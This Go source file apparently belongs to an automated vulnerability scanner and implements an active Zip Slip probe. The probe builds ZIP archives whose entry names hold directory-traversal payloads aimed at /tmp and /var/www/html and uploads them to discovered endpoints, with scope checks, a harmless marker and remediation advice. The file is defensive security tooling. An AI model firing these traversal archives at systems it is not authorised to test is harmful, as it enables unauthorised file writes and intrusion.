package scanner

import (
	"archive/zip"
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"

	"auto-bughunter/backend/internal/model"
	"auto-bughunter/backend/internal/safety"
	"auto-bughunter/backend/internal/scope"
)

// zipSlipMarker is embedded in the traversal archive entry's content so any
// later confirmation (e.g. the file becoming reachable at a predictable web
// path) is unambiguously attributable to this probe.
const zipSlipMarker = "abh_zipslip_c4e91"

// zipSlipTraversalNames are archive entry names using directory-traversal
// sequences (PayloadsAllTheThings "Zip Slip" technique). A ZIP/TAR extractor
// that does not sanitise entry names before joining them to the extraction
// root will write outside the intended directory.
var zipSlipTraversalNames = []string{
	"../../../../../../tmp/" + zipSlipMarker + ".txt",
	"..\\..\\..\\..\\..\\..\\Temp\\" + zipSlipMarker + ".txt",
	"../../../../../../var/www/html/" + zipSlipMarker + ".txt",
}

// zipSlipControlName is a benign, non-traversal entry name used as a control
// upload so we only flag the endpoint when it accepts archives at all *and*
// does not appear to reject/sanitise traversal entry names any differently
// than a normal one.
const zipSlipControlName = "abh_zipslip_control.txt"

// zipSlipRejectionSignals are response body substrings suggesting the server
// detected and rejected a malicious/traversal filename.
var zipSlipRejectionSignals = []string{
	"invalid file name", "invalid filename", "path traversal",
	"illegal path", "directory traversal", "unsafe path", "zip slip",
	"entry name", "not allowed",
}

// runZipSlipProbe is an active probe for the PayloadsAllTheThings "Zip Slip"
// technique: archive-extraction path traversal via crafted entry filenames.
// It reuses the upload-endpoint discovery from the file-upload probe, then
// submits a ZIP archive whose single entry name contains a directory-
// traversal sequence. Because a black-box scanner cannot directly observe the
// filesystem an extractor writes to, the probe uses a conservative heuristic:
//
//  1. Upload a benign control archive (normal entry name).
//  2. Upload a traversal archive (entry name escapes the extraction root).
//
// If both are accepted (HTTP 2xx, or a body signal indicating processing)
// and the traversal upload's response shows no sign of filename validation
// (no rejection signature, and a response shape/status similar to the
// control), the endpoint is flagged as accepting archives without apparent
// entry-name sanitisation — the precondition for Zip Slip if the archive is
// later extracted server-side.
func (s *Service) runZipSlipProbe(ctx context.Context, input RunInput, bodyText string) []model.Finding {
	if input.Options.PassiveOnly {
		return nil
	}

	candidates := discoverUploadEndpoints(input.Target, bodyText, input.Scope, input.Options.SeedRuntimeEndpoints)
	if len(candidates) == 0 {
		return nil
	}

	if input.Emit != nil {
		input.Emit(model.ScanEvent{
			Type:    model.ScanEventCommand,
			Command: fmt.Sprintf("zip-slip %s", input.Target),
			Message: fmt.Sprintf("Probing %d potential upload endpoints for Zip Slip (archive entry-name traversal)", len(candidates)),
		})
	}

	var findings []model.Finding
	emitted := map[string]bool{}

	for _, ep := range candidates {
		if err := safety.ValidateOutboundURL(ep); err != nil {
			continue
		}
		if !scope.IsURLInScope(ep, input.Scope) {
			continue
		}
		// Phase 2 coverage accounting.
		RecordProbedKey(http.MethodPost, ep, "")

		fid := "zip-slip-" + hhSlug(ep)
		if emitted[fid] {
			continue
		}

		controlBody, controlCT, err := buildZipUpload(zipSlipControlName, "safe control content")
		if err != nil {
			continue
		}
		controlStatus, _, ok := s.zipSlipUpload(ctx, input, ep, controlBody, controlCT)
		if !ok {
			continue
		}
		if controlStatus >= 400 {
			// Server rejects archive uploads outright (or this isn't really
			// an archive-accepting endpoint) — no signal either way.
			continue
		}

		var traversalName, traversalResp string
		traversalAccepted := false
		var traversalCode int
		for _, name := range zipSlipTraversalNames {
			traversalBody, traversalCT, err := buildZipUpload(name, zipSlipMarker)
			if err != nil {
				continue
			}
			code, resp, ok := s.zipSlipUpload(ctx, input, ep, traversalBody, traversalCT)
			if !ok {
				continue
			}
			traversalName = name
			traversalCode = code
			traversalResp = resp
			if code < 400 {
				traversalAccepted = true
				break
			}
		}

		if !traversalAccepted {
			continue
		}
		if matchAnyLower(traversalResp, zipSlipRejectionSignals) != "" {
			// Server explicitly flagged the traversal filename — sanitised.
			continue
		}

		emitted[fid] = true
		findings = append(findings, model.Finding{
			ID:       fid,
			Category: "file-upload",
			Severity: model.SeverityMedium,
			Title:    "Archive upload accepted without apparent entry-name (Zip Slip) validation",
			Description: fmt.Sprintf(
				"The upload endpoint %s accepted a ZIP archive containing an entry name with a "+
					"directory-traversal sequence (%q) the same way it accepted a benign control archive, "+
					"with no rejection signature in the response. If the server extracts this archive using "+
					"a naive path-join (e.g. Java's ZipEntry/`new File(dir, entry.getName())`, unpatched "+
					"Python zipfile/tarfile, or Node `adm-zip`) without validating that the resolved path stays "+
					"inside the extraction directory, an attacker can write arbitrary files outside the intended "+
					"directory (Zip Slip / CVE-2018-1002200 class), potentially achieving remote code execution "+
					"by overwriting executable or configuration files.",
				ep, traversalName,
			),
			Evidence: fmt.Sprintf(
				"Control upload (entry=%q) → HTTP %d; traversal upload (entry=%q) → HTTP %d; no rejection signature observed in traversal response",
				zipSlipControlName, controlStatus, traversalName, traversalCode,
			),
			Recommendation: "Before extracting any archive, resolve each entry's target path and verify it remains " +
				"within the intended extraction directory (canonicalize and use a prefix check, or Go's " +
				"`filepath.Clean`+`strings.HasPrefix` idiom, Java `Path.normalize()`+`startsWith`, or a hardened " +
				"library such as `zip-slip-protect`/`archiver` with traversal guards). Reject any entry name " +
				"containing `..`, an absolute path, or that resolves outside the extraction root.",
			Confidence:    0.55,
			AffectedURL:   ep,
			CWE:           "CWE-22",
			OWASPCategory: "A08:2021 - Software and Data Integrity Failures",
			Sources:       []string{"active-scanner", "zip-slip-probe"},
			ReproductionSteps: []string{
				fmt.Sprintf("Create a ZIP archive with a single entry named %q containing arbitrary content.", traversalName),
				fmt.Sprintf("POST the archive as a multipart file upload to %s.", ep),
				fmt.Sprintf("Observe HTTP %d — the server accepted the archive without rejecting the traversal filename.", traversalCode),
				"If the server extracts uploaded archives, verify out-of-band whether a file was written outside the extraction directory (e.g. a webshell dropped into the web root).",
			},
			BusinessTags: []string{"zip-slip", "file-upload", "path-traversal"},
			EvidenceFields: map[string]string{
				"validationType":   "active-probe",
				"controlEntryName": zipSlipControlName,
				"traversalEntry":   traversalName,
				"controlStatus":    fmt.Sprintf("%d", controlStatus),
				"traversalStatus":  fmt.Sprintf("%d", traversalCode),
			},
		})
	}

	return findings
}

// zipSlipUpload POSTs a pre-built multipart body to ep and returns the
// response status code and truncated body text.
func (s *Service) zipSlipUpload(ctx context.Context, input RunInput, ep string, body *bytes.Buffer, contentType string) (int, string, bool) {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, ep, body)
	if err != nil {
		return 0, "", false
	}
	req.Header.Set("Content-Type", contentType)
	ApplyAuthProfile(req, input.AuthProfile)

	resp, err := s.doRequestWithRetry(ctx, req, input.Options)
	if err != nil || resp == nil {
		return 0, "", false
	}
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, fileUploadBodyLimit))
	_ = resp.Body.Close()
	return resp.StatusCode, string(respBody), true
}

// buildZipUpload constructs an in-memory ZIP archive containing a single
// entry (entryName, content) and wraps it in a multipart/form-data body with
// field name "file", mirroring buildMultipartUpload's shape.
func buildZipUpload(entryName, content string) (*bytes.Buffer, string, error) {
	var zipBuf bytes.Buffer
	zw := zip.NewWriter(&zipBuf)
	w, err := zw.Create(entryName)
	if err != nil {
		return nil, "", err
	}
	if _, err := w.Write([]byte(content)); err != nil {
		return nil, "", err
	}
	if err := zw.Close(); err != nil {
		return nil, "", err
	}

	safeArchiveName := "archive_" + zipSlipSanitizeName(entryName) + ".zip"
	return buildMultipartUpload(safeArchiveName, "application/zip", zipBuf.String())
}

// zipSlipSanitizeName produces a short, filesystem/URL-safe label from an
// archive entry name for use in the *outer* multipart filename (which itself
// must not trip traversal filters unrelated to the technique under test).
func zipSlipSanitizeName(name string) string {
	repl := strings.NewReplacer("/", "_", "\\", "_", ".", "_", "..", "_")
	out := repl.Replace(name)
	if len(out) > 24 {
		out = out[:24]
	}
	return out
}
